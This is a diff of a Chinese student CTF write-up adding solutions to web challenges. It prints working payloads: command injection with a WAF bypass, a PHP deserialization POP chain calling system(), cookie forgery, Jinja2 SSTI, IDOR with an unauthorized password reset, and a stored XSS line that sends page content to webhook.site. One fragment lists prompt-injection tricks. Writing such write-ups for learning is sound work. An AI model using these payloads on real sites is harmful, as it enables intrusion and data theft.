@@ -6,7 +6,7 @@
 
 >**赛道：** 校内、新生
 
->**注1：** 解题时有大量 AI 成分，wp 全文为纯手搓。Orz. Orz.
+>**注1：** 解题时有大量 AI 成分，wp 全文为纯手搓（有从资料和AI摘过来的语句）。Orz. Orz.
 
 >**注2：** 本文中所有本地 linux 操作均是在 wsl2 的 kali 中进行的。
 
@@ -1404,7 +1404,7 @@ password=112233
 
 *📌Summary :*
 
-- 随手扫 `robots.txt` 文件。
+- 随手扫 `robots.txt` 文件。
 - 只是前端用 html 的 `disabled` 属性把按钮锁住了，但后端并没有真正校验权限。
 - 网页 DOM 元素可直接在浏览器中修改和热更新。
 - 对 HTML 属性的基本了解。
@@ -1647,11 +1647,11 @@ cat notes.txt  # 查看内容
 
 或者 `find /usr -perm -4000` 命令，看一下设置了 setuid 位的文件，输出里面也有 pingx 。
 
-这说明 `pingx` 工具是有 root 权限的，“普通用户跑诊断”是因为 setuid root。
+这说明 `pingx` 工具是有 root 权限的，“普通用户跑诊断”是因为 setuid root。
 
 那么 `pingx --help` 一下发现就是 `ping` 的帮助，所以按照 `ping` 的命令去试。输入 `pingx 127.0.0.1;id` ，返回里发现 `id` 命令能够被执行！
 
-那么执行 `pingx "127.0.0.1;cat /flag"` ，发现 `flag` 关键字会被 waf 拦截。
+那么执行 `pingx "127.0.0.1;cat /flag"` ，发现 `flag` 关键字会被 waf 拦截。
 
 再尝试执行 `pingx "127.0.0.1;head</fla''g"` ，搞定。
 
@@ -1720,7 +1720,7 @@ cat notes.txt  # 查看内容
 
 和真站对比，发现多出来了“小虎鲸的文档库”（进入按钮在其下方被隐藏起来了鼠标放上去才能显示，或者检查元素/源代码可以找到入口），进去之后发现 get 请求形如 `/docs.php?file=docs/intro.php` ，后面这个 `file=文件地址` 或许可以利用。
 
-访问 `/docs.php?file=/var/www/html/docs.php` ，发现网页无限循环嵌套生成了一大堆页面，一直加载中，很卡。这是因为 `docs.php` 又包含了自己，无限递归，说明后端代码用的是会执行 php 的方式（ `include` / `require` ），不是只读文本（ `file_get_contents` ）。
+访问 `/docs.php?file=/var/www/html/docs.php` ，发现网页无限循环嵌套生成了一大堆页面，一直加载中，很卡。这是因为 `docs.php` 又包含了自己，无限递归，说明后端代码用的是会执行 php 的方式（ `include` / `require` ），不是只读文本（ `file_get_contents` ）。
 
 联想到提示“服务器日志在哪里呢”。那么 f12网络 看一下响应标头，发现 server 是 apache，所以尝试访问一下 `/docs.php?file=/var/log/apache2/access.log` ，成功了！下面回显出来一大段日志，
 
@@ -1782,13 +1782,19 @@ pip install git-dumper
 git-dumper "http://80-b0d9a82b-2820-44b7-8061-793e2036eb27.challenge.ctfplus.cn/.git/" ./git
 ```
 
-进入 git 文件夹，打开 `secret.php` ，发现写明了获取 flag 的方法，但存在不可见 unicode 字符。
+进入 git 文件夹，用 vscode 打开 `secret.php` ，发现写明了获取 flag 的方法与要求，但存在不可见 unicode 字符。
+
+按其中的要求，在 vscode 里先拼接一个 payload 出来。
+
+![19-01](./images/img-20260929163236_Code_compressed.jpg)
+
+然后复制这一句，直接在浏览器地址栏的 secret.php 后面拼接上去，回车，浏览器会自动把地址转为 `/secret.php?cytcv=admin&%E2%81%A6fguyfnk%E2%81%A9kef=bmkfd%E2%81%A9ncd` 并访问，然后网页中出现了 flag。
 
 
 
 *📌FLAG :*
 
-
+`PKWCTF{56f48050-efdf-45f4-b81f-efa309127074}`
 
 
 
@@ -1800,6 +1806,7 @@ git-dumper "http://80-b0d9a82b-2820-44b7-8061-793e2036eb27.challenge.ctfplus.cn/
   - `objects/`：**所有版本的文件内容**（zlib 压缩），即使文件后来被删了也能挖出来
   - `index`：暂存区，记录文件路径与 blob 哈希的对应关系
   - `COMMIT_EDITMSG`：最后一次提交说明
+- 注意 **Unicode 不可见字符**，他们不会在前端直接显示出来，需要扒源码放到专业编辑器里才能发现。
 
 ---
 
@@ -1807,25 +1814,114 @@ git-dumper "http://80-b0d9a82b-2820-44b7-8061-793e2036eb27.challenge.ctfplus.cn/
 
 *📌Question :*
 
+```text
+thinkthink
+```
 
+进网页点“查看源码”：
+
+```php
+<?php
+
+class Logger {
+    public $logFile;
+    public $content;
+
+    public function __destruct() {
+        file_put_contents($this->logFile, $this->content);
+    }
+}
+
+class Database {
+    public $handler;
+
+    public function __toString() {
+        return $this->handler->query();
+    }
+}
+
+class Admin {
+    public $command;
+
+    public function __call($name, $args) {
+        return system($this->command);
+    }
+}
+
+if (isset($_GET['data'])) {
+    @unserialize(base64_decode($_GET['data']));
+}
+
+?>
+```
 
 
 
 *📌Solution :*
 
+用户输入经 `base64_decode` 后直接 `unserialize`，应该存在 **php 反序列化** 漏洞。
 
+本地先写个 `gen.php` 用于生成 payload：
+
+```php
+<?php
+class Logger {
+    public $logFile;
+    public $content;
+}
+class Database {
+    public $handler;
+}
+class Admin {
+    public $command;
+}
+
+$admin = new Admin();
+$admin->command = $argv[1] ?? 'id';
+
+$db = new Database();
+$db->handler = $admin;
+
+$logger = new Logger();
+$logger->logFile = '/tmp/x';   // 任意路径即可
+$logger->content = $db;
+
+echo base64_encode(serialize($logger)), PHP_EOL;
+```
+
+- 实际上是生成了下面这段东西然后 base64 编码了：
+
+  ```text
+  O:6:"Logger":2:{
+    s:7:"logFile";s:6:"/tmp/x";
+    s:7:"content";O:8:"Database":1:{
+      s:7:"handler";O:5:"Admin":1:{
+        s:7:"command";s:2:"id";
+      }
+    }
+  }
+  ```
+
+题中特意说“隐藏在运行环境中的 flag”，那就先试环境变量：
+
+```bash
+curl -s "http://80-dbba714b-5876-4702-8614-2e8a04f28ba9.challenge.ctfplus.cn/?data=$(php gen.php 'echo $FLAG')"
+```
+
+响应开头就是 flag。
 
 
 
 *📌FLAG :*
 
-
+`PKWCTF{80bda794-8c11-44a2-846e-ce58ec003111}`
 
 
 
 *📌Summary :*
 
-
+- 看到 `unserialize(用户输入)`，大概率是 **php 反序列化** 的漏洞。
+- **POP 链**三件套：`__destruct` 当起点（脚本结束必触发）、`__toString` 当桥（对象转字符串）、`__call` 当终点（调不存在的方法）。
 
 ---
 
@@ -1833,25 +1929,76 @@ git-dumper "http://80-b0d9a82b-2820-44b7-8061-793e2036eb27.challenge.ctfplus.cn/
 
 *📌Question :*
 
+```text
+茉莉蜜茶，好喝到爆，只有管理员才能品尝美味。
+```
 
+![21-01](./images/img-20260929172131_msedge_compressed.jpg)
 
 
 
 *📌Solution :*
 
+随便输入用户密码点登录，发现 cookie 里有个 `identification` ，base64 解码出来是个 **php 序列化对象**：
 
+```text
+O:12:"Session\User":1:{s:8:"username";s:5:"guest";}
+```
+
+也就是说，身份是靠 cookie 里的序列化对象识别的，那么伪造一下就行了。
+
+直接改成 admin 试试，登录页提示 `waf 这样是喝不到茉莉蜜茶的` ，被发现了呜呜呜。。
+
+查资料可知，php 反序列化有个 `S` 类型，支持十六进制转义。所以改成这样：
+
+```text
+O:12:"Session\User":1:{s:8:"username";S:5:"\61\64\6d\69\6e";}
+```
+
+- `\61\64\6d\69\6e` 就是 `admin` 。
+- 后面的 s 换成了大写的 `S` 。
+
+base64 编码后塞回 cookie，发送请求，得到下面代码：
+
+```php
+<?php
+highlight_file(__FILE__);
+if(isset($_GET['code'])){
+    $code = $_GET['code'];
+    if (!preg_match('/^[A-Za-z\(\)_;]+$/', $code)) {
+        die('Format error!');
+    }
+    if (preg_match('/get[a-z]{5,}/i', $code)) {
+        die('Prohibited pattern!');
+    }
+    if (substr($code, -1) !== ';') {
+        $code .= ';';
+    }
+    eval($code);
+}
+?>
+```
+
+过滤规则只允许字母、括号、下划线、分号。那么使用：
+
+```text
+?code=print_r(get_defined_vars());
+```
+
+携带刚刚的 cookie 发送这个 get 请求，然后在一大坨的回显中搜 pkw，即可。
 
 
 
 *📌FLAG :*
 
-
+`PKWCTF{688b31aa-930b-4458-bc9a-53a0238d072e}`
 
 
 
 *📌Summary :*
 
-
+- 身份 Cookie 可能是 php 序列化对象，可能可以伪造。
+- php 反序列化有个 `S` 类型，支持十六进制转义。
 
 ---
 
@@ -1859,25 +2006,62 @@ git-dumper "http://80-b0d9a82b-2820-44b7-8061-793e2036eb27.challenge.ctfplus.cn/
 
 *📌Question :*
 
+```text
+速应云是某公司的用户支持中心，遇到问题就提个工单吧。
+我们的值班客服非常敬业，每隔一会儿就会刷新一遍工作台处理新工单。
+```
 
+注册登录后：
+
+![22-01](./images/img-20260929174722_msedge_compressed.jpg)
+
+![22-02](./images/img-20260929174814_msedge_compressed.jpg)
 
 
 
 *📌Solution :*
 
+说明有 bot 会自动打开页面，而且大概率有管理员权限。
 
+侧边栏有个“客服工作台”，地址是 `/agent` ，点进去 403。cookie 解码后形如 `{"is_agent":0,"uid":8,"username":"qwe"}j»¿\Qëê
+Ëà©_Þ;}Òö` ，看上去是有加密。
+
+提示信息说明工单支持 HTML。先验证一下 XSS，提交一个工单：
+
+```html
+<img src=x onerror=alert(1)>
+```
+
+详情页原样渲染，存储型 XSS 成功！
+
+看响应头发现 cookie 是 HttpOnly 的，js 读不到 `document.cookie` ，不能偷。
+
+但 bot 打开的就是 `/agent` （客服工作台），可以直接让它把页面内容外带出来。所以工单里提交：
+
+```html
+<img src=x onerror="new Image().src='https://webhook.site/<UUID>/?c='+document.body.innerText">
+```
+
+- 可以用下面的命令直接拿到 webhook.site 的 uuid。
+
+  ```bash
+  curl -X POST https://webhook.site/token -H "Content-Type: application/json" -d '{}'
+  ```
+
+提交工单后等一会儿，浏览器访问：`https://webhook.site/token/<UUID>/requests` ，会有一堆东西，搜 pkw 即可找到 flag。
 
 
 
 *📌FLAG :*
 
-
+`PKWCTF{9ecbd660-019d-463f-8fba-5b0f581970e9}`
 
 
 
 *📌Summary :*
 
-
+- **存储型 XSS（Stored XSS）**：恶意脚本存服务器，管理员执行了就会中招。本题入口是支持 html 的工单。
+- cookie **HttpOnly** 时偷不了会话，就改成让 bot 把页面内容外带。
 
 ---
 
@@ -1885,25 +2069,89 @@ git-dumper "http://80-b0d9a82b-2820-44b7-8061-793e2036eb27.challenge.ctfplus.cn/
 
 *📌Question :*
 
-
+```text
+不要在校园论坛里暴露敏感信息
+```
 
 
 
 *📌Solution :*
 
+登录页面源码里有一段注释：
 
+```html
+<!--
+  TODO: 新生测试账户，比赛结束后记得删掉
+  username: newbie
+  password: 123456
+-->
+```
+
+用这个登录先。
+
+技术交流置顶帖“【教程】Flask 模板引擎 Jinja2 从入门到放弃”里写着：
+
+```text
+最近带大一新生做课程作业，发现好多同学对 Flask 的模板渲染一脸懵，写个入门帖。
+
+Flask 用的是 Jinja2 模板引擎，视图函数返回的字符串里，形如 {{ 表达式 }} 的内容会被当成模板语法求值。比如：
+
+@app.route("/hi")
+def hi():
+    name = request.args.get("name", "world")
+    return render_template_string("Hello, " + name)
+
+
+此时如果传入 {{ 7*7 }}，页面就会显示 49。
+
+什么时候容易出问题呢？——当你把"用户输入"直接拼进模板再渲染的时候。尤其是个人签名、昵称、公告这类字段，很多人图省事就直接 render_template_string，这是非常危险的写法。
+
+别小看这个漏洞：模板里能摸到全局对象，顺着 ???? 一路爬，就能拿到 ???? 模块，再调用 ???? 执行系统命令，什么都不在话下。
+
+所以我把论坛里所有展示用户签名的地方都改成了纯文本转义，个人资料页目前还是用的老写法（渲染太快，还没改完）。
+嗯……希望没人会注意到吧。
+```
+
+```text
+学到了，所以模板渲染如果拼用户输入会怎样？
+```
+
+```text
+回楼上：轻则被 XSS，重则直接 RCE。具体自己试试就知道了。
+```
+
+个人资料页源码里还有注释：
+
+```html
+<!-- 个性签名：由后端渲染（漏洞点），此处仅展示结果 -->
+<div class="sig-box">
+  <div class="sig-lab">✎ 个性签名</div>
+  <div class="content">Hello world!</div>
+</div>
+```
+
+根据提示，去设置页面把个性签名改成 `{{7*7}}` ，访问个人主页，签名栏显示 49 —— 确认是 SSTI。
+
+经过尝试，发现 waf 会拦 `os`、`import` 这些关键字。那就不用 `os.popen`，改用 `builtins.open` 直接读文件：
+
+```text
+{{lipsum.__globals__['__builtins__']['open']('flag').read()}}
+```
+
+保存后会自动跳转，签名栏输出 flag。
 
 
 
 *📌FLAG :*
 
-
+`PKWCTF{0140f077-efac-47a4-a7a3-5c8d30efc6b1}`
 
 
 
 *📌Summary :*
 
-
+- **SSTI（服务端模板注入）**：用户输入被模板引擎（如 Jinja2）当模板渲染。`{{7*7}}` 是经典探测。
+- WAF 过滤 `os`/`import` 时，可以用 `lipsum.__globals__['__builtins__']['open']` 绕开，直接读文件。
 
 ---
 
@@ -1911,25 +2159,63 @@ git-dumper "http://80-b0d9a82b-2820-44b7-8061-793e2036eb27.challenge.ctfplus.cn/
 
 *📌Question :*
 
-
+```text
+新学期开始了，学校上线了一套全新的教务系统，据说是由高年级学长开发的。
+```
 
 
 
 *📌Solution :*
 
+用登录页写着的 `test01 / 123456` 登录。
 
+`js/common.js` 注释里给出了脚本索引；同学录页脚提示“往届毕业学生档案另行归档”； `js/teacher.js` 注释写着“教师名录（界面上不展示 note 字段）”。
+
+`/js/profile.js` 有个 `/api/profile/view?id=` 。试一下别人 id，发现能直接看，没校验是不是本人。
+
+根据提示，试一下同学录之外的 id=30，发现 `note` 字段里有半截 flag：
+
+```text
+"PKWCTF{6c07c621-d7f4-4 ——我是30号学长。毕业前我发现：教师端有个「账号管理」功能，可以重置任意账号的密码，但那个功能好像只是前端把入口藏起来了，后端到底拦没拦我不清楚……我毕业了没法再试，你们帮我试试？对了，王老师的工号是 T001。"
+```
+
+根据提示，在 `teachers.js` 里找到“重置密码”部分：
+
+```js
+  // 重置密码（账号管理）
+  document.getElementById('resetForm').addEventListener('submit', async (e) => {
+    e.preventDefault();
+    const toast = document.getElementById('resetToast');
+    toast.className = 'toast';
+    toast.style.display = 'none';
+    const data = await api('/api/teacher/resetPwd', 'POST', {
+      target: document.getElementById('resetTarget').value.trim(),
+      newPassword: document.getElementById('resetPwd').value
+    });
+    toast.className = 'toast ' + (data.code === 0 ? 'ok' : 'err');
+    toast.textContent = data.msg;
+    toast.style.display = 'block';
+  });
+```
+
+那么，尝试向 `/api/teacher/resetPwd` 发送 post 请求，body为 `target=T001&newPassword=123123` ，发现成功重置！
+
+用这个教师用户登录，访问 `/api/teacher/teachers` ，发现 `note` 字段是 `88e-9bfc-3eb697a547aa}` 。
+
+两段拼起来即可。
 
 
 
 *📌FLAG :*
 
-
+`PKWCTF{6c07c621-d7f4-488e-9bfc-3eb697a547aa}`
 
 
 
 *📌Summary :*
 
-
+- **IDOR（水平越权）**：某些接口不校验归属，能横向读任意学生档案和隐藏 note。
+- **垂直越权**：某些接口只靠前端藏入口，后端不校验角色，学生身份能重置教师密码。
 
 ---
 
@@ -1937,23 +2223,60 @@ git-dumper "http://80-b0d9a82b-2820-44b7-8061-793e2036eb27.challenge.ctfplus.cn/
 
 *📌Question :*
 
+```text
+实习生上题，不晓得写啥子
+```
 
+![25-01](./images/img-20260929194841_msedge_compressed.jpg)
 
 
 
 *📌Solution :*
 
+> *p.s. 感谢 Calfjing 师傅的指导  Orz.*
 
+这题是个旅行网站，登录页给出了测试账号和密码，但无特殊权限。
+
+首页源码里写了存在旧入口 `/webapp/carold/` ，访问后再查看源码，底部有一段 js：
+
+```javascript
+<!-- weinre remote debug loader -->
+<script>
+(function () {
+  function parseSearch(s) {
+    var o = {}, m = (s || "").replace(/^\?/, "").split("&");
+    for (var i = 0; i < m.length; i++) {
+      var p = m[i].split("=");
+      if (p[0]) o[decodeURIComponent(p[0])] = decodeURIComponent(p[1] || "");
+    }
+    return o;
+  }
+  var urlParams = parseSearch(location.search);
+  if (urlParams && urlParams.cw_debug) {
+    var host = "10.32.27.1:5389";
+    if (urlParams.cw_debug.indexOf(".") > -1) {
+      host = urlParams.cw_debug;
+    }
+    (function (e) {
+      e.setAttribute("src", "//" + host + "/target/target-script-min.js#anonymous");
+      document.getElementsByTagName("body")[0].appendChild(e);
+    })(document.createElement("script"));
+  }
+})();
+</script>
+```
+
+查询资料可知，这是 weinre（远程调试器）的脚本加载器，`cw_debug` 参数含 `.` 时 host 完全可控，或许可以利用 xss 漏洞。
+
+根据出题人提示，用大字典爆破路径。尝试 `DirBuster-2007_directory-list-2.3-medium.txt` ，成功扫出来了 `/nest` 路径，这个路径是 oss 对象存储。
+
+根据出题人提示，该站点存在巡检 bot，根据 nest鸽巢应联想到 pigeon 鸽子。让 ai 做一个与 pigeon 有关的大字典，继续爆破，并且要爆破多级路径，最后发现 bot 巡检链接提交口竟然是 `/pigeon/submit` ，巡站记录在 `/pigeon/status` 。
 
 
 
 *📌FLAG :*
 
 
-
-
-
-*📌Summary :*
 
 
 
@@ -1989,156 +2312,6 @@ PKWCTF{The_mo0n_1s_be3ut1ful_tOnigh7!!!}
 
 ### 27. 糖衣炮弹【入门】
 
-*📌Question :*
-
-
-
-
-
-*📌Solution :*
-
-
-
-
-
-*📌FLAG :*
-
-
-
-
-
-*📌Summary :*
-
-
-
----
-
-### 28. gogogo！出发咯【入门】
-
-*📌Question :*
-
-
-
-
-
-*📌Solution :*
-
-
-
-
-
-*📌FLAG :*
-
-
-
-
-
-*📌Summary :*
-
-
-
----
-
-### 29. 澳门新葡京【简单】
-
-*📌Question :*
-
-
-
-
-
-*📌Solution :*
-
-
-
-
-
-*📌FLAG :*
-
-
-
-
-
-*📌Summary :*
-
-
-
----
-
-### 30. 暗号断点【简单】
-
-*📌Question :*
-
-
-
-
-
-*📌Solution :*
-
-
-
-
-
-*📌FLAG :*
-
-
-
-
-
-*📌Summary :*
-
-
-
----
-
-### 31. 大鱼吃小鱼【简单】
-
-*📌Question :*
-
-
-
-
-
-*📌Solution :*
-
-
-
-
-
-*📌FLAG :*
-
-
-
-
-
-*📌Summary :*
-
-
-
----
-
-### 32. 与旧日对话·第一章【简单】
-
-*📌Question :*
-
-
-
-
-
-*📌Solution :*
-
-
-
-
-
-*📌FLAG :*
-
-
-
-
-
-*📌Summary :*
-
 
 
 ## 0x03 -> Pwn
@@ -2151,209 +2324,9 @@ NVlpcjU1eUw1THFHNkwrWjVZUy81WldsNUx1VzVaYTE1TG1mNkk2cjViNlg1WldLNVpXSzVaV0s1WldL
 
 ## 0x04 -> Crypto
 
-### 33. PKWSEC 入职考核机【入门】
-
-*📌Question :*
-
-
-
-
-
-*📌Solution :*
-
-
-
-
-
-*📌FLAG :*
-
-
-
-
-
-*📌Summary :*
-
-
-
----
-
-### 34. Lucky Machine【入门】
-
-*📌Question :*
-
-
-
-
-
-*📌Solution :*
-
-
-
-
-
-*📌FLAG :*
-
-
-
-
-
-*📌Summary :*
-
 
 
 ## 0x05 -> Misc
-
-### 35. 你瞅啥【入门】
-
-*📌Question :*
-
-
-
-
-
-*📌Solution :*
-
-
-
-
-
-*📌FLAG :*
-
-
-
-
-
-*📌Summary :*
-
-
-
----
-
-### 36. De-Fusion【入门】
-
-*📌Question :*
-
-
-
-
-
-*📌Solution :*
-
-
-
-
-
-*📌FLAG :*
-
-
-
-
-
-*📌Summary :*
-
-
-
----
-
-### 37. pyjail-沉鱼【入门】
-
-*📌Question :*
-
-
-
-
-
-*📌Solution :*
-
-
-
-
-
-*📌FLAG :*
-
-
-
-
-
-*📌Summary :*
-
-
-
----
-
-### 38. pyjail-落雁【简单】
-
-*📌Question :*
-
-
-
-
-
-*📌Solution :*
-
-
-
-
-
-*📌FLAG :*
-
-
-
-
-
-*📌Summary :*
-
-
-
----
-
-### 39. pyjail-惊鸿【简单】
-
-*📌Question :*
-
-
-
-
-
-*📌Solution :*
-
-
-
-
-
-*📌FLAG :*
-
-
-
-
-
-*📌Summary :*
-
-
-
----
-
-### 40. 静谧之眼【简单】
-
-*📌Question :*
-
-
-
-
-
-*📌Solution :*
-
-
-
-
-
-*📌FLAG :*
-
-
-
-
-
-*📌Summary :*
 
 
 
@@ -2426,160 +2399,3 @@ What is 1+1?
   | 后缀 `[SYSTEM]` 注入    | 在正常问题后追加伪系统消息     |
 
   
-
----
-
-### 42. 小锐 · 招新数据台【简单】
-
-*📌Question :*
-
-
-
-
-
-*📌Solution :*
-
-
-
-
-
-*📌FLAG :*
-
-
-
-
-
-*📌Summary :*
-
-
-
----
-
-### 43. 小锐 · RAG【简单】
-
-*📌Question :*
-
-
-
-
-
-*📌Solution :*
-
-
-
-
-
-*📌FLAG :*
-
-
-
-
-
-*📌Summary :*
-
-
-
----
-
-### 44. 小锐 · 长期记忆【简单】
-
-*📌Question :*
-
-
-
-
-
-*📌Solution :*
-
-
-
-
-
-*📌FLAG :*
-
-
-
-
-
-*📌Summary :*
-
-
-
----
-
-### 45. 小锐· 插件系统【简单】
-
-*📌Question :*
-
-
-
-
-
-*📌Solution :*
-
-
-
-
-
-*📌FLAG :*
-
-
-
-
-
-*📌Summary :*
-
-
-
----
-
-### 46. 小锐 · 内部知识库【中等】
-
-*📌Question :*
-
-
-
-
-
-*📌Solution :*
-
-
-
-
-
-*📌FLAG :*
-
-
-
-
-
-*📌Summary :*
-
-
-
-
-
-## 0x07 -> OSINT
-
-### 47. osint-1【简单】
-
-*📌Question :*
-
-
-
-
-
-*📌Solution :*
-
-
-
-
-
-*📌FLAG :*
-
-
-
-
-
-*📌Summary :*
-
